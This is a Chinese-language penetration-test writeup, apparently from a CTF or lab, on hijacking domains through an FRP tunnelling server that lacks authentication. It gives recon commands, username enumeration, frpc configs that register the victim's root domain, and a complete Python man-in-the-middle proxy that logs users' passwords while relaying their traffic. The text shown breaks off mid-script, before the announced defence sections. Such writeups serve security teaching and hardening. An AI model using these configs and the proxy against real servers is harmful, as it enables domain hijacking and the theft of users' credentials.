# 内网穿透服务域名劫持 — FRP 无认证 + 域名代理劫持 + 中间人攻击 完整 Writeup

> 题目分类: 黑盒渗透测试 | 类型: 内网穿透安全 / 基础设施安全
>
> 目标架构: VPS(FRP) → 家用服务器(nginx + Spring Boot)

**题目分类：内网穿透安全 / 基础设施安全**。本题考察的是 **FRP 内网穿透服务未配置认证** → **域名代理劫持** → **中间人流量拦截** 的完整攻击链。

核心思路可以用一句话概括：**FRP 服务器没有配置 auth.token，攻击者可以直接注册域名代理，将用户流量劫持到自己的电脑上，透明转发给真实后端的同时窃取所有凭证和数据。**

## 目录

- [第一章：你需要先知道的知识](#第一章你需要先知道的知识)
- [第二章：目标结构分析](#第二章目标结构分析)
- [第三章：信息收集——从端口扫描到完整源码泄露](#第三章信息收集从端口扫描到完整源码泄露)
- [第四章：FRP 无认证——最致命的入口](#第四章frp-无认证最致命的入口)
- [第五章：域名劫持——把别人的域名变成你的代理](#第五章域名劫持把别人的域名变成你的代理)
- [第六章：中间人攻击——为什么代理到你本地还能看到真实页面](#第六章中间人攻击为什么代理到你本地还能看到真实页面)
- [第七章：完整攻击复现](#第七章完整攻击复现)
- [第八章：其他发现的安全问题](#第八章其他发现的安全问题)
- [第九章：如何防御](#第九章如何防御)
- [第十章：总结](#第十章总结)

## 第一章：你需要先知道的知识

在理解这个攻击之前，你需要知道几个概念。如果你已经了解 FRP，可以跳过直接看第二章。

### 1.1 什么是 FRP（Fast Reverse Proxy）

很多人家里有一台小服务器（比如跑 Home Assistant、跑自己的网站），但是家庭宽带的 IP 通常不对外暴露，外网无法直接访问。FRP 就是解决这个问题的工具。

FRP 分成两个部分：

```
┌─────────────┐          ┌─────────────┐          ┌──────────────┐
│  你的电脑     │          │  VPS(公网)   │          │  家里的服务器  │
│  (浏览器)    │          │  FRP Server  │          │  FRP Client   │
│             │          │  (frps)      │          │  (frpc)       │
└──────┬──────┘          └──────┬───────┘          └──────┬───────┘
       │                        │                         │
       │  1. 访问 VPS:8001      │                         │
       │───────────────────────>│                         │
       │                        │  2. FRP 转发到家里       │
       │                        │────────────────────────>│
       │                        │                         │
       │                        │  3. 家里服务器处理后返回  │
       │                        │<────────────────────────│
       │  4. 响应返回给你的浏览器 │                         │
       │<───────────────────────│                         │
```

- **FRP Server (frps)**：运行在有公网 IP 的 VPS 上，监听端口，接收连接
- **FRP Client (frpc)**：运行在家里的服务器上，主动连接到 FRP Server，注册"代理"

注册代理时，frpc 告诉 frps："当有人访问 `www.example-target.com` 这个域名时，把流量转发到我这里来。"

这样，外部用户访问 VPS 上的端口时，流量就被"穿透"到了家里。

### 1.2 FRP 认证机制

FRP 有一个 **auth.token** 配置项。如果 frps 配置了 token：

```toml
# frps.toml（服务器端）
auth.token = "my_secret_password"
```

那么 frpc 连接时也必须提供相同的 token：

```toml
# frpc.toml（客户端）
auth.token = "my_secret_password"
```

token 不匹配，连接被拒绝。**如果 frps 没有配置 auth.token，任何人都连得上。** 这就是本文的核心漏洞。

### 1.3 HTTP 请求中的 Host 头

每个 HTTP 请求都带一个 `Host` 头，告诉服务器你访问的是哪个域名：

```http
GET / HTTP/1.1
Host: www.example-target.com:8001
```

FRP Server 用这个 Host 头来决定把流量转发给哪个客户端。如果 Host 匹配到客户端 A 注册的域名，就转发给 A；如果匹配到客户端 B 注册的域名，就转发给 B。

### 1.4 中间人攻击（MITM）

中间人攻击（Man-In-The-Middle）是指攻击者坐在你和服务器之间，你以为是和服务器通信，实际上所有流量都先经过攻击者：

```
正常情况：
  你的浏览器 ──────────────────> 服务器

被劫持后：
  你的浏览器 ───> 攻击者 ────> 服务器
                (偷看/修改)
```

关键点：攻击者不只是拦截，还会把请求**转发给真正的服务器**，再把响应**转发回给你**。这样你看到的是正常的网页，完全不知道中间有人偷看。

### 1.5 Source Map（源码映射）

现代前端开发使用 Webpack 等工具把 TypeScript/JSX 代码编译压缩成一行 JavaScript。为了方便调试，编译工具可以同时生成一个 `.map` 文件，记录压缩后代码和原始代码的对应关系。

浏览器开发者工具会自动加载 `.map` 文件还原源码。**如果 `.map` 文件被部署到了生产环境，任何人都可以还原出完整的前端源代码。**
## 第二章：目标结构分析

这一章我们来弄清楚目标服务器的整体架构——它有哪些服务、怎么连接、流量是怎么走的。理解架构是理解攻击的前提。

### 2.1 端口扫描

用 nmap 扫描目标 IP 的开放端口：

```bash
nmap -sS -sV -p 1-10000 <TARGET_IP>
```

结果：

| 端口 | 服务 | 说明 |
|------|------|------|
| 53 | DNS | 域名解析服务 |
| 80 | nginx/1.20.1 | 静态网站（模板首页） |
| 444 | nginx/1.24.0 | HTTPS（未配置证书） |
| 8000 | FRP Server #1 bind port | FRP 客户端连接端口 |
| 8001 | FRP Server #1 vhost HTTP | FRP 虚拟主机 HTTP 端口 |
| 8002 | FRP Server #1 vhost HTTPS | FRP 虚拟主机 HTTPS 端口 |
| 8010 | FRP Server #2 bind port | 第二个 FRP 实例 |
| 8011 | FRP Server #2 vhost HTTP | 第二个 FRP 的 vhost |
| 8012 | FRP Server #2 vhost HTTPS | 第二个 FRP 的 vhost |

端口 8000/8001/8002 是一套 FRP 服务，8010/8011/8012 是另一套。两套独立的 FRP 实例运行在同一台 VPS 上。

### 2.2 完整架构图

通过后续分析，还原出的完整架构：

```
                    公网 VPS (<TARGET_IP>)
                    ┌─────────────────────────────────────────┐
                    │                                         │
 用户浏览器         │  Port 80: nginx (静态网站首页)            │
 ──────────> Port 80 ──> nginx 返回模板页面                    │
                    │                                         │
 用户浏览器         │  Port 8000: FRP Server #1 (bind)         │
 ──────────> Port 8001 ──> FRP vhost HTTP                     │
                    │         │                                │
                    │         │ 根据 Host 头路由                │
                    │         ▼                                │
                    │   家里服务器的 frpc                       │
                    │   (通过 FRP 隧道连接)                     │
                    └─────────┬───────────────────────────────┘
                              │
                              │ FRP 隧道 (TCP 长连接)
                              │
                    ┌─────────▼───────────────────────────────┐
                    │  家里的服务器 (内网 IP)                     │
                    │                                         │
                    │  frpc ──> nginx/1.24.0 (Ubuntu)          │
                    │              │                           │
                    │              ├── 静态文件 (React SPA)     │
                    │              │   数据管理平台前端           │
                    │              │                           │
                    │              └── 反向代理 ──> Spring Boot │
                    │                              localhost:8080│
                    │                              Java 后端 API │
                    └─────────────────────────────────────────┘
```

### 2.3 流量路径

当用户访问 `http://www.example-target.com:8001/` 时，流量的完整路径：

```
1. 浏览器发请求: GET / HTTP/1.1, Host: www.example-target.com:8001
2. DNS 解析 www.example-target.com → <TARGET_IP>
3. TCP 连接到 <TARGET_IP>:8001
4. VPS 上的 FRP Server 收到 HTTP 请求
5. FRP 读取 Host 头: www.example-target.com
6. 匹配到家里服务器注册的代理（subdomain = "www"）
7. FRP 通过隧道把请求转发给家里服务器的 frpc
8. frpc 转发给本地 nginx
9. nginx 返回 React SPA 的 HTML
10. 响应原路返回给浏览器
```

第 5-6 步是理解攻击的关键：**FRP 根据 Host 头决定流量转发给谁。** 如果攻击者能注册一个和目标相同的域名，流量就会转发给攻击者。

### 2.4 技术栈总结

| 层 | 技术 | 版本 |
|----|------|------|
| 前端 | React + Ant Design | create-react-app 脚手架 |
| 后端 | Spring Boot + Spring Security | 2.x |
| 数据库 | H2 (嵌入式) | 内置 |
| 反向代理 | nginx | 1.24.0 (Ubuntu) |
| 内网穿透 | FRP | 服务端版本不明，客户端 0.61.1 可连接 |
## 第三章：信息收集——从端口扫描到完整源码泄露

这一章我们从外到内逐步收集信息。信息收集是渗透测试的基础，决定了后续攻击的方向。

### 3.1 端口 80：静态站

访问 `http://<TARGET_IP>:80/` 返回一个纯静态的模板页面。nginx 1.20.1，没有 HTTPS，没有安全头。

这个端口和后面的攻击关系不大，但它暴露了 VPS 的基本信息。

### 3.2 Source Map 泄露——意外的宝藏

**怎么知道有 Source Map 的？**

浏览器在加载 JS 文件时，如果同目录下存在同名的 `.js.map` 文件，会自动加载它来还原源码。这是 Webpack 等构建工具的标准行为。所以我只需要按照命名规则猜一下：

```bash
# 页面加载了 main.73a44879.js
# 按照惯例，source map 文件名通常是 main.js.map
curl -s http://<TARGET_IP>:8001/static/js/main.js.map -o main.js.map
ls -la main.js.map
# -rw-r--r-- 1 user user 10.5M  main.js.map
```

返回了 10.5MB 的文件——Source Map 确实存在且可公开访问。

> **核心发现**：Source Map 泄露了完整的应用架构——包括 54 个 API 端点、硬编码的 Static SID、自定义认证头机制、Java 包名、内网 IP 和开发者个人信息。

**静态文件能被 curl 直接访问，这正常吗？**

正常。前端文件（JS/CSS/HTML）本来就要给浏览器下载的，所以 `/static/` 目录是公开的。问题不在于 static 能访问，而在于 **`.map` 文件不应该部署到生产环境**。正常只部署 `.js` 文件，`.map` 文件仅用于本地调试。

用 Python 解析 source map，提取源文件：

```python
import json, os

with open('main.js.map') as f:
    sm = json.load(f)

sources = sm.get('sources', [])
contents = sm.get('sourcesContent', [])

print(f"总文件数: {len(sources)}")
# 总文件数: 1482

for i, (path, content) in enumerate(zip(sources, contents)):
    if content is None:
        continue
    clean = path.replace('webpack://webapp/', '')
    out_path = os.path.join('sources', clean)
    os.makedirs(os.path.dirname(out_path), exist_ok=True)
    with open(out_path, 'w') as f:
        f.write(content)
```

结果：**1482 个源文件被完整还原**，其中 68 个是业务代码。

> **核心发现**：Source Map 泄露了完整的应用架构——包括 54 个 API 端点、硬编码的 Static SID、自定义认证头机制、Java 包名、内网 IP 和开发者个人信息。

### 3.3 从源码中发现的关键信息

#### 3.3.1 硬编码的 Static SID

在 `index.tsx` 的 axios 拦截器中：

```typescript
// 每个请求都会附带这个硬编码的 SID
config.headers[CommonConstants.REQUEST_HEADER.STATIC_SID] =
  "f47ac10b-58cc-4372-a567-0e02b2c3d479";
```

这个 SID 是一个 UUID，硬编码在前端代码里。每个 API 请求都带着它。

#### 3.3.2 自定义认证机制

前端使用三个自定义头部进行认证：

```typescript
// constants/CommonConstants.ts
REQUEST_HEADER: {
  USER_SID: "x-user-sid",      // 登录后的 session ID
  STATIC_SID: "x-static-sid",  // 硬编码的静态 SID
  REQ_TIMESTAMP: "x-req-timestamp",  // 请求时间戳
}
```

axios 拦截器的工作方式：

```typescript
// index.tsx
axios.interceptors.request.use(async (config) => {
  const loginInfo = LoginUtils.getLoginInfo();
  let loginData = loginInfo?.data;

  // 如果已登录，添加 user-sid 到 header 和 body
  if (loginData) {
    config.headers["x-user-sid"] = loginData.sessionId;
    config.data["sessionId"] = loginData.sessionId;  // 同时注入 body！
  }

  // 始终添加 static-sid
  config.headers["x-static-sid"] = "f47ac10b-58cc-4372-a567-0e02b2c3d479";
  config.headers["x-req-timestamp"] = `${new Date().getTime()}`;
  return config;
});
```

#### 3.3.3 API 端点映射

从源码中提取出 54 个 API 端点，分为两类：

```
/api/open/*    → 公开接口，不需要登录
  /api/open/login/login          登录
  /api/open/login/logout         登出
  /api/open/login/loginRefresh   刷新 session
  /api/open/stock/getSectorList  数据列表
  /api/open/stock/stockDetail    详情
  /api/open/fund/getFundGainsPotentials  基金收益
  ...

/api/private/* → 私有接口，需要 x-user-sid 认证
  /api/private/account/getAll    所有账户
  /api/private/simulation/*      模拟交易
  /api/private/schedule/*        定时任务
  /api/private/stockHolding/*    持仓
  /api/private/db/*              数据库操作
  /api/private/hardware/*        硬件信息
  ...
```

#### 3.3.4 内部信息泄露

源码注释中包含开发者信息：

```typescript
// RequestUtils.ts 第31行注释
// 8001是服务器上frps的响应端口，请求这个端口后会穿透到家里的小服务器，
// 8080是本地服务端启动的响应端口
```

以及 Java 包名（如 `com.example.app.controller.LoginController`），内部 IP 地址等敏感信息。

### 3.4 用户名枚举

利用源码中发现的登录接口，测试不同的用户名：

```bash
# 存在的用户名
curl -X POST http://<TARGET_IP>:8001/api/open/login/login \
  -H "Content-Type: application/json" \
  -H "Host: www.example-target.com" \
  -d '{"username":"admin","password":"wrong"}'
# 返回: {"errorCode":"PASSWORD_ERROR","errorMsg":"原密码不正确"}

# 不存在的用户名
curl -X POST http://<TARGET_IP>:8001/api/open/login/login \
  -H "Content-Type: application/json" \
  -H "Host: www.example-target.com" \
  -d '{"username":"nonexistent","password":"wrong"}'
# 返回: {"errorCode":"USERNAME_NOT_FOUND","errorMsg":"账户名无效"}
```

不同的错误信息确认了 `admin` 用户存在。但密码爆破 300+ 次均未成功。

**"泄露"在哪里？** 两种不同的错误信息（`PASSWORD_ERROR` vs `USERNAME_NOT_FOUND`），让攻击者可以批量试用户名，区分出哪些注册了。这叫**用户枚举**。

### 3.5 后端技术栈识别

不是猜的，是多个证据组合判断出来的：

**Spring Boot 的证据：**

```bash
# 1. 错误响应格式（Spring Boot 标准错误页面）
curl http://<TARGET_IP>:8001/api/xxx -H "Host: www.example-target.com"
# 返回:
{"timestamp":"2026-05-31T17:21:05.309+0000","status":401,"error":"Unauthorized",
 "message":"Invalid request","path":"/api/xxx"}
# ↑ 这个格式是 Spring Boot 的 BasicErrorController 生成的，一眼就能认出来

# 2. JSON 解析错误暴露了 Jackson（Spring Boot 默认 JSON 库）
curl -X POST ... -d 'not json'
# 返回: com.fasterxml.jackson.core.JsonParseException: ...
# ↑ Jackson 是 Spring Boot 默认集成的 JSON 解析器

# 3. 源码中的 Java 包名
# LoginUtils.ts 中引用: com.example.app.controller.LoginController
# ↑ Java 的包命名规范
```

**Spring Security 的证据：**

```bash
# 响应头中有 Spring Security 默认添加的安全头
curl -I http://<TARGET_IP>:8001/api/private/xxx -H "Host: www.example-target.com"
# X-Frame-Options: DENY          ← Spring Security 默认配置
# X-Content-Type-Options: nosniff ← Spring Security 默认配置
# X-Xss-Protection: 1; mode=block← Spring Security 默认配置

# 未认证请求返回 401，格式是 Spring Security 的标准响应
{"status":401,"error":"Unauthorized","message":"Invalid request"}
```

**版本 2.x 的判断：**

- Spring Boot 3.x 要求 Java 17+，使用 `jakarta.*` 命名空间
- 源码和错误信息中看到的是 `javax.*`（旧版命名空间）→ 是 2.x
- StrictHttpFirewall 拒绝分号、`..` 等特殊字符的行为符合 Spring Security 5.x（Spring Boot 2.x 的默认版本）

**React + Ant Design 的证据：**

直接从 Source Map 还原的源码中看到的：

```typescript
// App.tsx
import React, { useEffect, useState } from "react";         // ← React
import { Button, Input, message, Space } from "antd";        // ← Ant Design
import { BrowserRouter as Router, Route, Routes } from "react-router-dom";  // ← React Router

// reportWebVitals.ts 和 manifest.json 的格式 → create-react-app 脚手架生成的
```

`create-react-app` 不是版本号，是 Facebook 提供的 React 项目模板/脚手架工具。

**nginx 版本的证据：**

```bash
curl -I http://<TARGET_IP>:80/
# Server: nginx/1.20.1    ← 直接暴露在 HTTP 响应头里

curl -I http://<TARGET_IP>:8001/ -H "Host: www.example-target.com"
# Server: nginx/1.24.0 (Ubuntu)  ← 家里服务器的 nginx 版本
```

nginx 默认会在响应头里暴露完整版本号。

### 3.6 未授权 API 访问

使用硬编码的 Static SID 可以直接访问公开接口：

```bash
curl -X POST http://<TARGET_IP>:8001/api/open/stock/getSectorList \
  -H "Content-Type: application/json" \
  -H "x-static-sid: f47ac10b-58cc-4372-a567-0e02b2c3d479" \
  -H "x-req-timestamp: $(date +%s)000"
# 返回: {"success":true,"data":[...31个板块...]}
```

但私有接口被 Spring Security 拦截，返回 401。
## 第四章：FRP 无认证——最致命的入口

前三章我们收集了信息，但没能拿到登录权限。这一章我们换一个方向——不攻破应用层，而是攻破基础设施层。FRP 就是那个突破口。

### 4.1 怎么知道 8000 端口是 FRP 的

不是一开始就知道的，是推理出来的：

1. nmap 扫描发现 8000 端口开着，但无法识别服务类型
2. 用 curl 发 HTTP 请求 → 连接被关闭（不是 HTTP 服务）
3. 用 FRP 客户端尝试连接 → `login to server success`
4. 同时 8001 端口返回"powered by frp"的 404 页面

这些证据加在一起，确认 8000 是 FRP bind port（客户端连接用的端口），8001 是 vhost HTTP port（处理 HTTP 请求、按域名路由的端口）。

### 4.2 尝试连接 FRP 服务器

端口扫描发现 8000 和 8010 看起来像是 FRP 的 bind port。我下载了 FRP 客户端（v0.61.1），写了一个最简配置：

```toml
# frpc-test.toml
serverAddr = "<TARGET_IP>"
serverPort = 8000
# 注意：没有 auth.token
```

运行：

```bash
./frpc -c frpc-test.toml
```

输出：

```
[I] login to server success, get run id [55ca39011f012bf0]
```

**连接成功了。** 没有报认证失败，没有要求密码。这意味着 FRP 服务器**没有配置 auth.token**。

对第二个 FRP 实例（端口 8010）也做同样的测试，同样连接成功。两套 FRP 服务器都没有认证。

FRP 允许多个客户端连接同一个服务端端口，不会冲突。每个客户端连接后注册自己的代理（名称+域名），互不影响。就像一个 nginx 可以同时反向代理多个网站一样。

### 4.3 这意味着什么

FRP 没有 auth.token 意味着：

1. **任何人都可以连接**——不需要密码，不需要任何凭证
2. **任何人都可以注册代理**——把自己的服务暴露在 VPS 的端口上
3. **如果域名没被占用，任何人都可以抢注**——这是域名劫持的基础

这不是一个应用层漏洞，这是一个**基础设施配置错误**。但它的影响比大多数应用层漏洞都要严重。
## 第五章：域名劫持——把别人的域名变成你的代理

这一章是整个攻击的核心：利用 FRP 无认证的弱点，注册一个属于目标网站的域名代理，把用户流量劫持到攻击者的电脑上。

### 5.1 FRP 域名路由原理

FRP Server 收到 HTTP 请求时，根据 **Host 头**来决定转发给哪个客户端。这个过程叫 **vhost（Virtual Host，虚拟主机）**——一台服务器可以通过不同的域名提供不同的服务，就像一栋楼里有多个公司，你进门说找哪家公司（Host 头），前台（FRP）就把你带到对应的公司。

```
请求 1: Host: www.example-target.com → 匹配到家里服务器的代理 → 转发给 frpc
请求 2: Host: evil.attacker.com      → 没有匹配 → 返回 FRP 404 页面
```

家里服务器的 frpc 用 `subdomain = "www"` 注册了代理。我怎么知道的？两个证据：

1. 带着请求 `Host: www.example-target.com` → 返回真实的 React SPA 页面
2. 我尝试用 `subdomain = "www"` 注册 → 报错 `router config conflict`（路由冲突，说明已经被别人注册了）

但 `example-target.com`（不带 www 的根域名）**没人注册**。

### 5.2 尝试注册 www.example-target.com（失败）

首先尝试抢注 `www.example-target.com`：

```toml
# frpc.toml
serverAddr = "<TARGET_IP>"
serverPort = 8000

[[proxies]]
name = "hijack-www"
type = "http"
localIP = "127.0.0.1"
localPort = 9998
customDomains = ["www.example-target.com"]
```

结果：

```
[W] [hijack-www] start error: custom domain [www.example-target.com] should not
    belong to subdomain host [example-target.com]
```

被拒绝了。原因是 FRP Server 配置了 `subdomain_host = "example-target.com"`，`www.example-target.com` 被视为这个 host 的子域名。要用子域名，必须用 `subdomain` 字段而不是 `customDomains`。

再用 `subdomain` 字段试：

```toml
[[proxies]]
name = "hijack-www"
type = "http"
localIP = "127.0.0.1"
localPort = 9998
subdomain = "www"
```

结果：

```
[W] [hijack-www] start error: router config conflict
```

**路由冲突！** 这说明家里服务器的 frpc 仍然注册着 `www` 这个子域名代理。

但注意报错信息中提到了 `subdomain host [example-target.com]`——这是 FRP Server 的 `subdomain_host` 配置。我没法直接读服务端的配置文件，但 FRP 在拒绝请求时**把配置信息泄露在了错误消息里**。

### 5.3 注册 example-target.com（成功！）

既然 `www` 子域名被占了，那就注册**根域名** `example-target.com`。

怎么知道根域名没人注册？试了才知道：用 `customDomains = ["example-target.com"]` 注册，返回 `start proxy success`（成功）。如果已经有人注册了，会返回 `router config conflict`——就像 `www` 那样。注册成功 = 没人占。

```toml
# frpc-hijack-root.toml
serverAddr = "<TARGET_IP>"
serverPort = 8000

[[proxies]]
name = "hijack-root"
type = "http"
localIP = "127.0.0.1"
localPort = 9998
customDomains = ["example-target.com"]
```

运行：

```bash
./frpc -c frpc-hijack-root.toml
```

输出：

```
[I] login to server success, get run id [73e92518e373e55a]
[I] proxy added: [hijack-root]
[I] [hijack-root] start proxy success   ← 成功！
```

**`example-target.com` 域名代理注册成功！** 现在所有访问 `example-target.com:8001` 的流量都会被转发到我的电脑的 9998 端口。

注意：**只有 8001 端口**会被代理。FRP Server 配置了 `vhostHTTPPort = 8001`，所以只有 8001 端口的 HTTP 流量会做域名路由。其他端口（如 8000 是 bind port，80 是 nginx）不受影响。

### 5.4 验证劫持

在本地启动一个简单的 HTTP 服务，只返回"DOMAIN HIJACKED!"：

```bash
python3 -c "
import http.server
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'<h1>DOMAIN HIJACKED!</h1>')
http.server.HTTPServer(('127.0.0.1', 9998), H).handle_request()
" &
```

然后用 curl 测试：

```bash
# 用劫持的域名访问
curl -H "Host: example-target.com" http://<TARGET_IP>:8001/
# 返回: <h1>DOMAIN HIJACKED!</h1>  ← 我的内容！

# 用正常的 www 域名访问
curl -H "Host: www.example-target.com" http://<TARGET_IP>:8001/
# 返回: <!doctype html>...<title>数据管理平台</title>  ← 真实网站
```

**同一个 IP 的同一个端口，不同的域名，访问到了不同的内容。** 这就是 FRP vhost 路由的工作方式。

### 5.5 为什么用户会访问根域名而不是 www 域名？

你可能会问：用户都是用 `www.example-target.com` 访问的，根域名谁会用？

首先，**两个域名确实都解析到同一个 IP**：

```bash
dig example-target.com       # A 记录 → <TARGET_IP>
dig www.example-target.com   # A 记录 → <TARGET_IP>
```

很多用户不会区分根域名和 www 域名，甚至搜索引擎可能两种都收录。

其次，即使不劫持根域名，**任何未被注册的子域名**（如 `open.example-target.com`、`api.example-target.com`）都可以注册——只要 DNS 配了通配符解析（`*.example-target.com` → <TARGET_IP>）。

```bash
# 检查是否有通配符 DNS
dig open.example-target.com    # 如果也解析到 <TARGET_IP> → 通配符生效
dig random123.example-target.com  # 同上
```

但这里有一个关键条件：**域名劫持能否成功取决于 DNS 配置**。如果 DNS 只配了 `www.example-target.com` 的 A 记录，没有配通配符，那 `open.example-target.com` 就无法解析到你的服务器，用户根本访问不到。nginx 配置不参与这个过程——nginx 只在流量到达服务器后才介入，而 DNS 决定了流量能不能到达服务器。

```typescript
const protocol = window.location.protocol;  // 获取当前页面的协议
const hostname = window.location.hostname;  // 获取当前页面的域名
const port = window.location.port;

return `${protocol}//${hostname}:${httpPort}${api}`;
```

前端拼 API 地址时用的是**当前页面的 hostname**。如果用户通过 `example-target.com:8001` 访问网站，所有 API 请求（包括登录）都会发到 `example-target.com:8001`——被劫持的域名。

实际场景中，根域名和 www 域名都能解析到同一个 IP。很多用户不会区分，甚至搜索引擎可能两种都收录。
## 第六章：中间人攻击——为什么代理到你本地还能看到真实页面

这是整个攻击中最让人困惑的部分。用户说："我理解域名被劫持了，但为什么流量到了你的电脑，我还能看到真实的网页？你不是应该只能显示你自己电脑上的内容吗？"

这一章专门回答这个问题。

### 6.1 关键区别：不是"替代"，而是"中转"

域名劫持有两种做法：

**做法 A：替代（攻击者自己提供内容）**
```
用户 → VPS → 攻击者的电脑
                 ↑ 返回攻击者自己写的假网页
```
这种做法用户会看到一个完全不同的页面，可能起疑。

**做法 B：中转（攻击者充当中间人）**
```
用户 → VPS → 攻击者的电脑 → 真实服务器
                ↑ 偷看+记录    ↑ 透明转发
```
这种做法用户看到的是**真实的网页**，完全正常。但攻击者在中间记录了所有经过的数据。

我们用的是**做法 B**。

### 6.2 中间人代理的工作原理

我在本地 9998 端口运行了一个 Python 脚本（MITM 代理），它做的事情很简单：

```python
# 伪代码——实际代码更完整，但核心逻辑就是这些
class MITMProxy:
    def handle_request(self, user_request):
        # 第1步：记录用户发来的请求（包括密码等敏感信息）
        log(f"拦截到请求: {user_request.path}")
        log(f"请求体: {user_request.body}")
        # 例如: {"username":"admin","password":"P@ssw0rd123!"}

        # 第2步：把请求原样转发给真实服务器
        # 关键：Host 头改成 www.example-target.com（指向真实的代理）
        real_response = forward_to(
            "http://<TARGET_IP>:8001" + user_request.path,
            headers={"Host": "www.example-target.com",  # 走真实的 FRP 代理
                     "x-static-sid": user_request.headers["x-static-sid"],
                     ...}
        )

        # 第3步：把真实服务器的响应原样返回给用户
        return real_response
```

用图来表示完整的流量路径：

```
用户浏览器输入: http://example-target.com:8001/
                    │
                    ▼
        ┌──── VPS (<TARGET_IP>) ─────┐
        │                                │
        │  FRP Server 端口 8001          │
        │  读取 Host: example-target.com  │
        │  匹配到我注册的代理            │
        │  转发到我的电脑                 │
        └───────────┬────────────────────┘
                    │ FRP 隧道
                    ▼
        ┌──── 我的电脑 (MITM 代理) ────┐
        │                               │
        │  1. 收到用户请求              │
        │  2. 记录请求内容（密码等）     │  ← 偷看！
        │  3. 重新发送请求给真实服务器    │
        │     Host: www.example-target.com│  ← 关键！用 www 走真实代理
        │                               │
        └───────────┬───────────────────┘
                    │ 新的 HTTP 请求
                    │ Host: www.example-target.com
                    ▼
        ┌──── VPS (<TARGET_IP>) ─────┐
        │                                │
        │  FRP Server 端口 8001          │
        │  读取 Host: www.example-target.com │
        │  匹配到家里服务器的代理         │
        │  转发到家里服务器               │
        └───────────┬────────────────────┘
                    │ FRP 隧道
                    ▼
        ┌──── 家里的服务器 ─────────────┐
        │                                │
        │  nginx → Spring Boot           │
        │  返回正常的网页/API 响应        │
        └───────────┬────────────────────┘
                    │
                    ▼ 响应原路返回
        VPS → 我的 MITM 代理 → VPS → 用户浏览器
                                   ↑
                                   用户看到正常的网页！
```

### 6.3 为什么 Host 头改了就能走不同的路？

这是理解整个攻击的核心。

MITM 代理在转发请求时，把 Host 头从 `example-target.com` 改成了 `www.example-target.com`。就这一个改动：

- `Host: example-target.com` → FRP 路由到**我的代理**（劫持的）
- `Host: www.example-target.com` → FRP 路由到**家里服务器**（真实的）

```
                     ┌── example-target.com ──→ 我的 MITM 代理 ──┐
用户请求 ──> FRP ────┤                                              ├──> 家里服务器
                     └── www.example-target.com ──> 家里服务器 ───┘
```

FRP 看的是 Host 头，不看请求从哪来。所以我的代理可以发一个不同 Host 头的请求，走不同的路由。

### 6.4 用户看到的效果

用户完全感觉不到异常：

1. 打开 `example-target.com:8001` → 看到正常的数据管理平台页面 ✅
2. 输入账号密码点登录 → 登录成功，跳转到工作台 ✅
3. 查看数据 → 数据正常显示 ✅

**唯一的变化**是所有请求都多走了"我的电脑"这一跳，增加了一点延迟（大约几百毫秒），用户根本察觉不到。

而在我的 MITM 代理的日志里：

```
[07:30:44] GET /                           ← 用户打开首页
[07:30:45] GET /static/css/main.5660c235.css  ← 加载样式
[07:30:46] GET /static/js/main.73a44879.js    ← 加载 JS
[07:30:58] GET /page/login-page/login-page?from=http://example-target.com:8001/...
                                               ← 跳转到登录页
============================================================
  [CREDENTIALS] username=admin password=P@ssw0rd123!   ← 密码被拦截！
============================================================
[07:31:15] POST /api/open/login/login (50b)    ← 登录请求
```

**用户名和密码，明文，完整地出现在我的日志里。**

### 6.5 HTTPS 能防住这个攻击吗？

能增加难度，但不能完全防住。

**HTTPS 有效的场景**：如果 `example-target.com:8001` 配置了 HTTPS，浏览器会要求服务器出示 `example-target.com` 的 TLS 证书。我的 MITM 代理没有这个证书的私钥，无法完成 TLS 握手，浏览器会显示"证书不可信"的警告页面。

**HTTPS 不够的场景**：
1. 用户点击"继续访问"忽略警告 → MITM 照样生效
2. 如果你的 8001 端口只支持 HTTP（目前就是这样），HTTPS 保护根本不存在
3. 根本的防护应该是 FRP 加认证——不让攻击者连接上来，而不是靠 HTTPS 增加中间人难度
## 第七章：完整攻击复现

这一章给出从零到拦截凭证的完整操作步骤。你可以在自己的授权环境中复现。

### 7.1 准备工作

```bash
# 下载 FRP 客户端
wget https://github.com/fatedier/frp/releases/download/v0.61.1/frp_0.61.1_darwin_arm64.tar.gz
tar xzf frp_0.61.1_darwin_arm64.tar.gz
mkdir -p workspace && cp frp_0.61.1_darwin_arm64/frpc workspace/frp/
```

### 7.2 第一步：验证 FRP 无认证

```toml
# frpc-test.toml
serverAddr = "<TARGET_IP>"
serverPort = 8000
```

```bash
timeout 5 ./frp/frpc -c frpc-test.toml
# 看到 "login to server success" → 无认证确认
```

### 7.3 第二步：注册域名代理

```toml
# frpc-hijack-root.toml
serverAddr = "<TARGET_IP>"
serverPort = 8000

[[proxies]]
name = "hijack-root"
type = "http"
localIP = "127.0.0.1"
localPort = 9998
customDomains = ["example-target.com"]
```

```bash
./frp/frpc -c frpc-hijack-root.toml &
# 看到 "[hijack-root] start proxy success" → 域名劫持成功
```

### 7.4 第三步：启动 MITM 代理

```python
#!/usr/bin/env python3
"""mitm_live.py — 中间人代理（教学用途，仅供授权测试）"""
import http.server, urllib.request, urllib.error, json, time

REAL_BACKEND = "http://<TARGET_IP>:8001"

class MITMHandler(http.server.BaseHTTPRequestHandler):
    def forward(self):
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length) if content_length > 0 else None

        # 记录所有请求
        print(f"  [{time.strftime('%H:%M:%S')}] {self.command} {self.path}", flush=True)

        # 拦截登录凭证
        if body and 'login' in self.path.lower():
            try:
                data = json.loads(body)
                if 'password' in data:
                    print(f"\n{'='*60}", flush=True)
                    print(f"  [CREDENTIALS] username={data.get('username')} "
                          f"password={data.get('password')}", flush=True)
                    print(f"{'='*60}\n", flush=True)
            except:
                pass

        # 转发到真实服务器（Host 头改成 www 走真实代理）
        headers = {'Host': 'www.example-target.com'}
        for key in ['Content-Type', 'x-static-sid', 'x-user-sid', 'x-req-timestamp']:
            if key in self.headers:
                headers[key] = self.headers[key]

        url = f"{REAL_BACKEND}{self.path}"
        try:
            req = urllib.request.Request(url, data=body,
                                         headers=headers, method=self.command)
            with urllib.request.urlopen(req, timeout=15) as resp:
                response_body = resp.read()
                self.send_response(resp.status)
                for key, val in resp.getheaders():
                    if key.lower() not in ('transfer-encoding', 'connection'):
                        self.send_header(key, val)
                self.end_headers()
                self.wfile.write(response_body)
        except urllib.error.HTTPError as e:
            self.send_response(e.code)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(e.read())

    do_GET = do_POST = do_PUT = do_DELETE = forward
    def log_message(self, *a): pass

